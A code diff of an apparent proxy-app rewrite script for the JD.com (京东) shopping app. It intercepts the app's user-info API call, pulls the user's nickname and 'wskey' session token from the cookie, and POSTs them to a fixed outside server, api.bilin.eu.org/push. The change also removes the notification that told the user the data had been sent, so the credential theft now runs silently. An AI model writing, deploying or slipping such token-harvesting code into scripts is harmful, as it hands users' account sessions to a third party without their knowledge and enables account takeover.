@@ -39,19 +39,15 @@ $.done();
 function GetCookie() {
     const Referer = $request.headers['Referer'] || '';
     const text = $response.body;
-    const json_str = JSON.stringify(text)
     const body = JSON.parse(text)
     var userPin = "pin=" + body.userInfoSns.unickName + ";";
-    //$.notify('成功!', '', userPin  )
     try {
         if ($request.url.indexOf('https://api.m.jd.com/client.action?functionId=newUserInfo') > -1) {
             var CV = $request.headers['Cookie'] || $request.headers['cookie'];
             var wsk = CV.match(/wskey=.+?;/);
             var realWsk = userPin + wsk[0]
-            //$.notify('成功!', '', realWsk);
-            let data={"key":realWsk,"source":"jd_app","type":"wsk"}
+            let data={"source":"jd_app","type":"wsk","value":realWsk,"pin":userPin}
             const opt = {url: "http://api.bilin.eu.org/push", body: JSON.stringify(data)}
-            $.notify("同步完成~","京东",data)
             $.http.post(opt).then((response) => JSON.parse(response.body))
         }else {
             $.notify('获取失败', '', '请检查匹配URL或配置内脚本类型 ‼️');
